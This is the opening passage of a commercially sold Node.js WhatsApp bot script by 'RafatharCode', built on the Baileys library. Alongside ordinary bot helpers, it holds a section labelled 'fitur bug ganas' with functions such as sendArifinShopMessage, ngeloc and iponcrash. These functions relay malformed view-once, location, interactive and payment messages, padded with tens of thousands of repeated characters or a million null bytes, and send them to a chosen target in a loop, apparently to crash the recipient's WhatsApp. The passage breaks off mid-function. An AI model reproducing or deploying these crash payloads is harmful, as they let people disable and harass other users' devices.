/*SC INI DI JUAL RESMI OLEH RAFATHARCODE

BASE : RafatharCode
CREATE : RafatharCode

HARGA SC RAFATHARCODE :

NO ENC : 65kK
ENC     : 45K

TELEGRAM : t.me/RafatharCode
YT : youtube.com/rafatharcode444
*/


require("./lib/settings/settings")
const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
InteractiveMessage,
proto, delay
} = require('@whiskeysockets/baileys')
const axios = require('axios');
const archiver = require('archiver');
const beta = require('betabotz-tools')
const bochil = require('@bochilteam/scraper');
const chalk = require('chalk');
const cheerio = require('cheerio')
const cookie = require('cookie')
const crypto = require('crypto')
const dylux = require('api-dylux')
const ffmpeg = require('fluent-ffmpeg')
const didyoumean = require('didyoumean');
const gtts = require('node-gtts')
const fs = require('fs');
const fetch = require('node-fetch')
const FormData = require("form-data");
const { sizeFormatter } = require("human-readable");
const format = sizeFormatter()
const jimp = require("jimp");
const ms = require("parse-ms");
const moment = require('moment-timezone');
const nou = require("node-os-utils");
const os = require('os')
const { Client } = require('ssh2');
const path = require('path')
const request = require('request')
const jsobfus = require('javascript-obfuscator')
const similarity = require('similarity')
const speed = require('performance-now')
const stream = require('stream');
const util = require('util');
const threshold = 0.72
const { fromBuffer } = require('file-type')
const { exec, spawn, execSync } = require('child_process')
const { performance } = require('perf_hooks')
const LINODE_API_TOKEN = global.apilinode;
const { promisify } = require('util');

//==========================

const own = JSON.parse(fs.readFileSync('./data/owner.json').toString())
const prem = require("./lib/general/premium");
const res = JSON.parse(fs.readFileSync('./data/reseller.json').toString())
const res3 = JSON.parse(fs.readFileSync('./data/reseller3.json').toString())
const resinstall = JSON.parse(fs.readFileSync('./data/resinstall.json').toString())
const asisten = JSON.parse(fs.readFileSync('./data/owner2.json').toString())
const jangan = JSON.parse(fs.readFileSync('./data/jangan.json').toString())
const { addGold, minGold, cekGold } = require('./lib/general/funcgold')
const { addSaldo, minSaldo, cekSaldo } = require('./lib/general/funcsaldo')
const { addLimit, minLimit, cekLimit } = require('./lib/general/funclimit')
let saldo = JSON.parse(fs.readFileSync("./data/saldo.json"));
let premium = JSON.parse(fs.readFileSync('./data/premium.json'));
let db_gold = JSON.parse(fs.readFileSync("./data/gold.json"));
let db_saldo = JSON.parse(fs.readFileSync("./data/saldo.json"));
let db_limit = JSON.parse(fs.readFileSync("./data/limit.json"));
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/general/respon-list');
let db_respon_list = JSON.parse(fs.readFileSync('./data/list-message.json'));
const { Saweria } = require("./lib/general/saweria")
let db_saweria = JSON.parse(fs.readFileSync('./data/saweria.json'));
const { uptotelegra } = require('./lib/general/upload')
const { getRegisteredRandomId, addRegisteredUser, checkRegisteredUser, createSerial } = require('./lib/general/register')
const { casinoSave, setCasino, deleteCasino } = require("./lib/game/casino");
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, aMonay, kMonay, cMonay } = require('./lib/general/funcmonay')
let db_monay = JSON.parse(fs.readFileSync("./data/monay.json"));

//==========================

const { pinterest } = require('./lib/general/pinterest')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot/clone')
const antispam = require("./lib/general/antispam");
const { sticker5 } = require('./lib/general/sticker')
let nplink = JSON.parse(fs.readFileSync('./data/antilink.json'));
let nplinkgc = JSON.parse(fs.readFileSync('./data/antilinkgc.json'));
const { UploadFileUgu, webp2mp4File } = require('./lib/general/uploader')

//==========================

const { convertAngka, text2img, scsearch, capcutdl, igdown, twiterdl, snapsave, GDriveDl, snapsavev2, youtubedlv2, convertv2, jadwalSholat, findKodeDaerah, downloadCapcut, searchTemplates, detailTemplates, GoogleImage, mediafireDl, stickerSearch } = require('./lib/general/scrape')
const api = require('btch-downloader')
const { Downloader } = require("@tobyg74/tiktok-api-dl")
const { mega } = require('megajs')
const { tiktokdl } = require('tiktokdl') 
const { y2mateplay, y2matemp3, y2matemp4 } = require('./lib/general/y2mate')
const yts = require('yt-search');
const ytdl = require("ytdl-core");

//==========================

const family100 = {}
const suit = {}
const tictactoe = {}
const petakbom = {}
const tebakgambar = {}
const tebakkalimat = {}
const tebakkata = {}
const tebaklirik = {}
const tebakanime = {}
const tebaklagu = {}
const kuis = {}
const tebakkimia = {}
const tebakbendera = {}
const siapakahaku = {}
const asahotak = {}
const susunkata = {}
const caklontong = {}
const kuismath = {}
const tebakgame = {}
const permintaan = {}
const laporan = {}
const userSessions = {};

//==========================

module.exports = rafatharcode = async (rafatharcode, m, chatUpdate, mek, store) => {
try {

const { type, quotedMsg } = m
const { toFirstCase, isNumber, formatp, parseMention, getRandom, generateProfilePicture, getCase, runtime, h2k, makeid, kyun, jsonformat, isUrl, fetchJson, sleep, getBuffer, msToDate, smsg, getGroupAdmins, getTime, TelegraPh, bytesToSize } = require("./lib/general/myfunc");

var body = (m.mtype === 'interactiveResponseMessage') 
? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id 
: (m.mtype === 'conversation') 
? m.message.conversation 
: (m.mtype === 'imageMessage') 
? m.message.imageMessage.caption 
: (m.mtype === 'videoMessage') 
? m.message.videoMessage.caption 
: (m.mtype === 'extendedTextMessage') 
? m.message.extendedTextMessage.text 
: (m.mtype === 'buttonsResponseMessage') 
? m.message.buttonsResponseMessage.selectedButtonId 
: (m.mtype === 'listResponseMessage') 
? m.message.listResponseMessage.singleSelectReply.selectedRowId 
: (m.mtype === 'templateButtonReplyMessage') 
? m.message.templateButtonReplyMessage.selectedId 
: (m.mtype === 'documentMessage') 
? m.message.documentMessage.caption 
: (m.mtype === 'messageContextInfo') 
? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) 
: "";
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[>°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[>°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const isCommand2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const command = prefix ? isCommand : isCommand2
const pushname = m.pushName || "No Name"
const botNumber = await rafatharcode.decodeJid(rafatharcode.user.id)
const bulan = moment.tz('Asia/Jakarta').format('MM/MMMM')
const tahun = moment.tz('Asia/Jakarta').format('YYYY')
const tanggal = moment().tz("Asia/Jakarta").format("dddd, d")
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wibTime = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const penghitung = moment().tz("Asia/Jakarta").format("dddd, D MMMM - YYYY")

const isCreator = [owner, ...own].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner = [owner, ...own].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isOwner ? true : prem.checkPremiumUser(m.sender, premium)
const isReseller = [owner, ...res].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isReseller2 = [owner, ...res3].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isResinstall = [owner, ...resinstall].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner2 = [owner, ...asisten].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isJangan = [owner, ...jangan].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isMediaa = /image|video/.test(mime)
const isPc = from.endsWith('@s.whatsapp.net')
const isGc = from.endsWith('@g.us')
const usedPrefix = prefix + command;
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const qmsg = (quoted.msg || quoted)
const isGroup = from.endsWith('@g.us')
const sender = m.key.fromMe ? (rafatharcode.user.id.split(':')[0]+'@s.whatsapp.net' || rafatharcode.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isBot = botNumber.includes(senderNumber)
const groupMetadata = m.isGroup ? await rafatharcode.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
const groupMembers = isGroup ? groupMetadata.participants : ''
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const tag = `${m.sender.split('@')[0]}`
const usere = `${m.sender.split('@')[0]}`+'@s.whatsapp.net'
const nomore = m.sender.replace(/[^0-9]/g, '')
const content = JSON.stringify(m.message)
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')
const isSticker = (type == 'stickerMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')

const isAntiLink = nplink.includes(m.chat) ? true : false
const isAntiLinkgc = nplinkgc.includes(m.chat) ? true : false

if (!rafatharcode.public) {
if (!isOwner && !m.key.fromMe) return
}

const contacts = JSON.parse(fs.readFileSync("./data/contacts.json"))
const isContacts = contacts.includes(sender)

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

const RafaStickSc = () => {
        let RafaStikRep = fs.readFileSync('./RafaMedia/sticker_reply/sc.webp')
        rafatharcode.sendMessage(from, { sticker: RafaStikRep }, { quoted: m })
        }
        const Rafa1StickSc = () => {
        let Rafa1StikRep = fs.readFileSync('./RafaMedia/sticker_reply/menu.webp')
        rafatharcode.sendMessage(from, { sticker: Rafa1StikRep }, { quoted: m })
        }
        const Rafa2StickSc = () => {
        let Rafa2StikRep = fs.readFileSync('./RafaMedia/sticker_reply/owner.webp')
        rafatharcode.sendMessage(from, { sticker: Rafa2StikRep }, { quoted: m })
        }

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
function monospace(string) {
return '```' + string + '```'
}

// Mengirim pesan "lazadaArifinMessage"
async function sendLazadaArifinMessage(userJid) {
  // Membuat pesan dari konten yang akan dikirim
  const message = generateWAMessageFromContent(userJid, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        lazadaArifinMessage: {
          degreesLatitude: '0',
          degreesLongitude: '0',
          caption: "🛍️PAKET LAZADA ARIFIN MODS NYA KAK DI BUKA YA" + 'ꦾ'.repeat(50000), // Repeating 'ꦾ' sebanyak 50000 kali
          sequenceNumber: '0',
          jpegThumbnail: ''
        }
      }
    }
  }), {
    userJid: userJid
  });

  // Mengirim pesan ke WhatsApp menggunakan Baileys
  await rafatharcode.relayMessage(userJid, message.message, {
    participant: {
      jid: userJid
    },
    messageId: message.key.id
  });
}

// Mengirim pesan "arifinshopMessage"
async function sendArifinShopMessage(userJid) {
  // Membuat pesan dari konten interaktif yang akan dikirim
  const message = generateWAMessageFromContent(userJid, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: '',
            subtitle: " "
          },
          body: {
            text: "ꋫ꒓ꂑꄘꂑꁹ ꁒꆂꁕꌚ"
          },
          footer: {
            text: 'xp'
          },
          nativeFlowMessage: {
            buttons: [{
              name: 'cta_url',
              buttonParamsJson: "{ display_text: 'ꋫ꒓ꂑꄘꂑꁹ ꁒꆂꁕꌚ', url: '', merchant_url: '' }"
            }],
            messageParamsJson: "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    userJid: userJid
  });

  // Mengirim pesan ke WhatsApp menggunakan Baileys
  await rafatharcode.relayMessage(userJid, message.message, {
    participant: {
      jid: userJid
    },
    messageId: message.key.id
  });
}

// Mengirim serangkaian pesan secara berulang
async function sendArifinLazMessages(userJid, numberOfMessages) {
  for (let i = 0; i < numberOfMessages; i++) {
    // Mengirim pesan interaktif dan pesan lazada secara bergantian
    await sendArifinShopMessage(userJid);
    await sleep(1500);  // Jeda 1.5 detik
    await sendLazadaArifinMessage(userJid);
    await sleep(1500);  // Jeda 1.5 detik
    await sendArifinShopMessage(userJid);
    await sleep(2000);  // Jeda 2 detik
    await sendLazadaArifinMessage(userJid);
    await sleep(500);   // Jeda 0.5 detik
    await sendArifinShopMessage(userJid);
    await sleep(500);   // Jeda 0.5 detik
  }
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

function formatBytes(bytes) {
  if (bytes === 0) {
    return "0 B";
  }
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return `${(bytes / 1024 ** i).toFixed(2)} ${sizes[i]}`;
}

async function Catbox(content) {
  const { ext, mime } = (await fileTypeFromBuffer(content)) || {};
  const blob = new Blob([content.toArrayBuffer()], { type: mime });
  const formData = new FormData();
  const randomBytes = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  formData.append("fileToUpload", blob, randomBytes + "." + ext);

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    },
  });

  return await response.text();
}

async function uploadToPomf(path) {
  try {
    const fileStream = fs.createReadStream(path);
    const formData = new BodyForm();
    formData.append('files[]', fileStream);

    const response = await axios.post('https://pomf.lain.la/upload.php', formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    return response.data.files[0].url
  } catch (error) {
    console.log("Error at pomf uploader in lib/uploader.js:", error)
    return "error"
  }
}


function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

if (wibTime < "23:59:59"){ var ucapanWaktu = 'Selamat malam'}
if (wibTime < "19:00:00"){ var ucapanWaktu = 'Selamat malam'}
if (wibTime < "18:00:00"){ var ucapanWaktu = 'Selamat sore'}
if (wibTime < "14:59:59"){ var ucapanWaktu = 'Selamat siang'}
if (wibTime < "10:00:00"){ var ucapanWaktu = 'Selamat pagi'}
if (wibTime < "06:00:00"){ var ucapanWaktu = 'Selamat pagi'}

try {
const currentTimee = Date.now();
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!('daftar' in user)) user.daftar = false
if (!('nama' in user)) user.nama = `${pushname}`
if (!('otp' in user)) user.otp = '-'
if (!('email' in user)) user.email = '-'
if (!('serial' in user)) user.serial = '-'
if (!('Rafathar' in user)) user.nolan = false
if (!('lastUnregTime' in user)) user.lastUnregTime = currentTimee
} else global.db.data.users[m.sender] = {
daftar: false,
nama: `${pushname}`,
otp: '-',
email: '-',
serial: '-',
Rafathar: false,
lastUnregTime: currentTimee
}
} catch (err){
console.log(err)
}

try {
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('antilink' in chats)) chats.antilink = false
if (!('antilinkgc' in chats)) chats.antilinkgc = false
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
antilink: false,
antilinkgc: false,
mute: false
}
} catch (err){
console.log(err)
}

fs.writeFileSync('./data/rafatharcode-db/database.json', JSON.stringify(global.db.data, null, 2))

var levelRole = cekSaldo(m.sender, db_saldo)
var role = 'New'
if (levelRole <= 1) {
role = 'Newbie'
} else if (levelRole <= 500) {
role = 'Bronze 1'
} else if (levelRole <= 2000) {
role = 'Bronze 2'
} else if (levelRole <= 4000) {
role = 'Bronze 3'
} else if (levelRole <= 6000) {
role = 'Silver 1'
} else if (levelRole <= 8000) {
role = 'Silver 2'
} else if (levelRole <= 10000) {
role = 'Silver 3'
} else if (levelRole <= 12000) {
role = 'Gold 1'
} else if (levelRole <= 14000) {
role = 'Gold 2'
} else if (levelRole <= 16000) {
role = 'Gold 3'
} else if (levelRole <= 18000) {
role = 'Platinum 1'
} else if (levelRole <= 20000) {
role = 'Platinum 2'
} else if (levelRole <= 22000) {
role = 'Platinum 3'
} else if (levelRole <= 24000) {
role = 'Platinum 4'
} else if (levelRole <= 26000) {
role = 'Platinum 5'
} else if (levelRole <= 28000) {
role = 'Diamond 1'
} else if (levelRole <= 30000) {
role = 'Diamond 2'
} else if (levelRole <= 32000) {
role = 'Diamond 3'
} else if (levelRole <= 34000) {
role = 'Diamond 4'
} else if (levelRole <= 36000) {
role = 'Diamond 5'
} else if (levelRole <= 38000) {
role = 'Master'
} else if (levelRole <= 40000) {
role = 'Master ✩'
} else if (levelRole <= 50000) {
role = 'Master ✩✩'
} else if (levelRole <= 60000) {
role = 'Master ✩✩✩'
} else if (levelRole <= 70000) {
role = 'Master ✯'
} else if (levelRole <= 80000) {
role = 'Master ✯✯'
} else if (levelRole <= 100000) {
role = 'Master ✯✯✯'
} else if (levelRole <= 110000) {
role = 'GrandMaster'
} else if (levelRole <= 120000) {
role = 'GrandMaster ✩'
} else if (levelRole <= 130000) {
role = 'GrandMaster ✩✩'
} else if (levelRole <= 140000) {
role = 'GrandMaster ✩✩✩'
} else if (levelRole <= 150000) {
role = 'GrandMaster ✯'
} else if (levelRole <= 160000) {
role = 'GrandMaster ✯✯'
} else if (levelRole <= 200000) {
role = 'GrandMaster ✯✯✯'
} else if (levelRole <= 200000000) {
role = 'Mr. Greatest'
} else if (levelRole <= 230000000) {
role = 'Mr. Greatest ✩'
} else if (levelRole <= 260000000) {
role = 'Mr. Greatest ✩✩'
} else if (levelRole <= 290000000) {
role = 'Mr. Greatest ✩✩✩'
} else if (levelRole <= 240000000) {
role = 'Mr. Greatest ✯'
} else if (levelRole <= 280000000) {
role = 'Mr. Greatest ✯✯'
} else if (levelRole <= 360000000) {
role = 'Mr. Greatest ✯✯✯'
} else if (levelRole <= 1000000000) {
role = 'Level Max'
}

rafatharcode.autoshalat = rafatharcode.autoshalat ? rafatharcode.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? rafatharcode.user.id : m.sender
let id = m.chat 
if (id in rafatharcode.autoshalat) {
return false
}
let jadwalSholat = {
shubuh: '04:29',
terbit: '05:44',
dhuha: '06:02',
dzuhur: '12:02',
ashar: '15:15',
magrib: '17:52',
isya: '19:01',
}
const datek = new Date((new Date).toLocaleString("en-US", {
timeZone: "Asia/Jakarta"
}));
const hours = datek.getHours();
const minutes = datek.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `Hai!, kini waktu *${sholat}* telah tiba...\nAmbilah air dan segeralah sholat 😇\n\n*${waktu}*\n_tuk wilayah Bandung dan sekitarnya_`
rafatharcode.autoshalat[id] = [
m.reply(caption),
setTimeout(async () => {
delete rafatharcode.autoshalat[m.chat]
}, 57000)]
}}

rafatharcode.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
rafatharcode.sendTeks = async(chatId, text = '', quoted = '', opts = {}) => {
return rafatharcode.sendMessage(chatId, { text: text, mentions: await rafatharcode.ments(text), ...opts}, {quoted: quoted})
};
rafatharcode.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return rafatharcode.sendMessage(jid, {poll: { name, values, selectableCount }})
};
const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};
const reply = (teks) => {
return rafatharcode.sendMessage(m.chat, { text: teks, mentions: ments(teks) }, {quoted: m})}

const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ?  rafatharcode.sendMessage(from, { text: teks, mentions: memberr, contextInfo: { "mentionedJid": memberr }}):  rafatharcode.sendMessage(from, {mentions: memberr,text: teks, contextInfo: { "mentionedJid": memberr }},{quoted: m})}
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [m.sender]}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `0@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${db.data.users[m.sender].nama}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${db.data.users[m.sender].nama},;;;\nFN:${db.data.users[m.sender].nama},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const ftext = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: {extendedTextMessage: {text: `${prefix+command} ${q}`,thumbnailUrl: thumb}}}
const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast" } : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": "", }, "title": `Payment by ${ownername}`,"description": null, "currencyCode": "IDR", "priceAmount1000": "30000000", "retailerId": `Powered by Rafathar`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
const floc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Powered by Rafathar`,jpegThumbnail: ""}}}


async function rafatharcodereply(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Channel ${wm}`,
newsletterJid: chjid + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `RafatharCode`,
body: ``,
previewType: "VIDEO",
thumbnailUrl: 'https://telegra.ph/file/2324daab2ea7ce51596fa.jpg', 
sourceUrl: sch, 
},
},
text: teks,
};
return rafatharcode.sendMessage(m.chat, nedd, {quoted: m,});
}

async function rafaloading () {
var rafacode = [
"_Hallo My Name Is RafatharCode_",
"_Script By : RafatharCode_",
"_🕊️ Thank You For Waiting..._",
]
let { key } = await rafatharcode.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'},  { quoted: m })

for (let i = 0; i < rafacode.length; i++) {
await sleep(100)
await rafatharcode.sendMessage(m.chat, {text: rafacode[i], edit: key }, { quoted: m });
}
}

async function rafatharcodereply2(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `Channel ${wm}`,
newsletterJid: chjid + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `RafatharCode`,
body: ``,
previewType: "VIDEO",
thumbnailUrl: "https://telegra.ph/file/2324daab2ea7ce51596fa.jpg", 
sourceUrl: syt, 
},
},
text: teks,
};
return rafatharcode.sendMessage(m.chat, nedd, {quoted: m,});
}

//fitur bug ganas

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./r/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - zxv`
}
}
}
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./r/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rafatharcode.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
async function aipong(target) {
await rafatharcode.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await rafatharcode.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
